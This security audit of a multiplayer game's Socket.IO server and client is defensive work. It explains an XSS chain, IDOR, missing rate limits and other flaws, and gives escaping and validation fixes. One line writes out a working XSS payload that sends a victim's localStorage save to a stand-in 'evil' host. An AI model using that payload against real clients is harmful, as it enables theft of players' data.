# Security & Bug Audit — 2026-07-04

> **STATUS (2026-07-04): findings 1–5 REMEDIATED** in the follow-up commit
> (`shared/utils/escapeHtml.js`, `server/sanitize.js`, `server/rateLimit.js`,
> `publicVillage()`, combat/raid clamps, devtools revert; 7 new tests in
> `tests/security.test.js`). The descriptions below are kept as the record of
> what was wrong and why. Not yet done: full server-authoritative combat (needs
> a bigger change to the client-authoritative sim), and a real 2-client
> injection test (verified via unit tests + escaped sinks + server stripping).

Scope: the multiplayer trust boundary (Socket.IO server + client render paths),
local persistence, and the Tauri shell. Single-player offline is low-risk (the
player only attacks themselves); **every finding below matters only once two
people share a server** — but the game ships that mode, so they're real.

Severity: **CRITICAL** = another player runs code / steals data in your client ·
**HIGH** = integrity/DoS a peer can trigger · **MED** = hardening · **LOW** = note.

---

## The headline chain (CRITICAL): rival name → XSS → save theft

A player fully controls their **village name, warden name, and icon**. The server
caps their length but **never sanitizes HTML** (`server/handlers/join.js:22-24`,
`rooms.js:29-31`), and the client renders them raw into `innerHTML` all over the
world/diplomacy UI. Because the app runs with `script-src 'unsafe-inline'` (forced
by its inline-`onclick` architecture) and an open `connect-src` (needed for
user-entered MP servers), injected script executes **and can read `localStorage`
and `fetch()` it to any host** — i.e. steal the victim's local save.

**Attack:** set your village name to
`<img src=x onerror="fetch('https://evil/x?d='+btoa(localStorage.getItem('hvm_save_v1')))">`,
join a room. When the victim's world map / diplomacy modal / server browser
renders your village, it fires — no click required.

### Confirmed sinks (all interpolate network-controlled strings into innerHTML)

| # | File:line | Fields | Trigger |
|---|---|---|---|
| 1 | `client/js/world.js:101` → `:164` | `v.name`, `v.kageName`, `v.icon`, `v.sealedBeasts` | any village in your world renders |
| 2 | `client/js/world.js:77` (pending-alliance rows) → `:164` | `p.fromName`, `p.fromIcon` | a rival proposes alliance |
| 3 | `client/js/world.js:185` `showDip` body → diplomacy modal | `fromName`, `fromIcon` | war declared / alliance / raid (`socket.js`) |
| 4 | `client/js/socket.js` `_renderServerBrowser` | `r.hostName`, `r.hostIcon`, `r.code` | opening the public server browser (pre-join!) |
| 5 | `client/js/socket.js` `_showTurnResolution` | `e.text` (world event) | each resolved turn |
| 6 | `client/js/panels/log.js` (`e.msg`) | war/gift/raid toasts built from `fromName`/`fromIcon` via `t()` | opening the Event Log |

`shared/utils/i18n.js` `t()` interpolates params with bare `String(v)` (no
escaping), so every toast built from a network name (sink #6) carries raw HTML
into `G.log`. **No `escapeHtml` helper exists anywhere in the codebase.**

### Fix (two layers — do both)

**A. Escape at every sink.** Add one helper and wrap network strings:

```js
// shared/utils/escapeHtml.js
export function escapeHtml(s) {
  return String(s ?? '').replace(/[&<>"']/g, c =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]))
}
```

Then e.g. `world.js:101`:
```js
// before: <div ...>${v.name}</div> ... Warden: ${v.kageName} ... ${v.icon}
// after:
`<div style="font-size:22px">${escapeHtml(v.icon)}</div>...
 <div ...>${escapeHtml(v.name)}</div>
 <div ...>Warden: ${escapeHtml(v.kageName)}</div>...
 <b style="color:#c9a84c">${v.sealedBeasts.map(escapeHtml).join(', ')}</b>`
```
Apply to all six sinks. For sink #6, escape when the toast is stored into `G.log`
(or escape `e.msg` at render in `log.js`) — but escaping the *name at the sink*
is cleaner than trying to sanitize inside `t()`.

**B. Validate at the server (defense in depth).** In `join.js` + `rooms.js`,
constrain the identity fields so a payload can't even be stored:
```js
const clean = (s, max) => String(s ?? '').replace(/[<>]/g, '').slice(0, max)
name:     clean(name, 32),
kageName: clean(kageName, 24),
icon:     [...String(icon ?? '🍃')].slice(0, 4).join('') || '🍃',   // was: unbounded, unvalidated
```
`sealedBeasts` (client-supplied via `sync_state`) should likewise be coerced to a
short array of short strings before broadcast.

---

## Other findings

### HIGH — server trusts client-declared combat power (`server/combat.js` + `handlers/sync.js:11`)
`resolveRaid` uses `attacker.power` / `defender.power`, but those come straight
from the client via `sync_state` (`v.power = power ?? v.power`). A raider can set
their own `power` arbitrarily high, **always win, and force the victim's client to
subtract ryo** (`raid_result` → client does `G.ryo -= res.ryoStolen`). Griefing +
integrity. Raids are also **not room-scoped** (`villages.get(targetId)` is the
global map) so a player in one room can raid someone in another. *Fix: derive
combat strength server-side (or from the persisted save), and require
`attacker.roomCode === defender.roomCode`.*

### HIGH — no rate limiting on any socket event
`launch_raid`, `send_gift`, `sync_state`, `join_room`, `list_rooms`, etc. have no
throttle. A single client can flood any of them → CPU/DB DoS, or brute-force
6-char private room codes. *Fix: a simple per-socket token bucket (e.g. N
events/sec) in the connection handler; cap `join_room` attempts.*

### HIGH — `playerId` is an unauthenticated bearer token (IDOR) (`join.js:64`, `rooms.js:111/146`)
The client sends its own `playerId`; the server does `loadGameState(playerId)` and
emits the full save back via `load_state`. Nothing binds `playerId` to the socket
or verifies ownership, so **anyone who learns another player's `playerId` gets
their entire saved game.** It's a random UUID (hard to guess), but it's a secret
with no rotation and it's echoed around in world state. *Fix: treat `playerId` as
a secret never broadcast, or bind it to an auth token; at minimum don't return
`load_state` for a `playerId` not established on this socket.*

### MED — no payload size cap (`server.js:21`, `sync.js`)
`new Server(server)` uses the default 1 MB `maxHttpBufferSize` and `fullState` is
persisted unvalidated. A crafted large `fullState` bloats memory/DB. *Fix: set a
sane `maxHttpBufferSize`, and cap/whitelist `fullState` before `saveGameState`.*

### MED — Tauri `devtools` feature currently enabled in release (`src-tauri/Cargo.toml:24`)
Added during this session's crash triage. Fine for now, but **gate it to debug
builds before shipping** so the production app doesn't ship an inspector:
`tauri = { version = "2.11.3", features = [] }` and rely on `#[cfg(debug_assertions)]`,
or use a `--features devtools` build flag when you need it.

### LOW — prototype-key assignment on restore (`save.js:103`, `socket.js` `load_state`)
`Object.keys(saved).forEach(k => G[k] = saved[k])` over JSON-parsed data. A key of
`__proto__` only reassigns `G`'s own prototype (not global `Object.prototype`), so
this isn't classic prototype pollution — but a hostile *server* save could still
set odd keys on `G`. Low risk; if hardening, skip `__proto__`/`constructor` keys.

### LOW — no Socket.IO CORS config (`server.js:21`)
Defaults to same-origin. This is *safe*, but it also means a **Tauri desktop
client (origin `tauri://localhost`) connecting to a hosted server will be refused**
during the polling handshake — a functional gap for "optional MP" in the packaged
app. If/when you enable cross-origin MP, set `cors: { origin: [...] }` explicitly
(don't blanket `*`).

---

## Not vulnerabilities (checked, clean)
- **Host-only room actions** (kick / transfer host / pause / close / timeout /
  max-players) are all correctly gated on `room.hostSocketId === socket.id`
  (`handlers/rooms.js`). No auth bypass.
- **Gift amount** is server-fixed (5000), not client-supplied.
- **Diplomacy/raid identity** — you can only act *as* `socket.id`; no spoofing the
  actor.
- **Supabase queries** use `.eq(col, val)` (parameterized) — no SQL injection.
- **Tauri shell** exposes only `core:default` capabilities — no fs/shell/http
  plugin surfaced to JS, no custom `invoke` commands.

## Suggested priority
1. XSS escape helper + apply to all 6 sinks + server-side identity validation (the CRITICAL chain).
2. Server-authoritative combat power + room-scoped raids.
3. Per-socket rate limiting.
4. `playerId` IDOR hardening.
5. devtools gating + payload cap before Steam ship.

> Note: this pass was **security-weighted**. It is not an exhaustive
> correctness sweep of all ~29k LOC — the general-bug findings here are the ones
> surfaced while tracing the trust boundary.
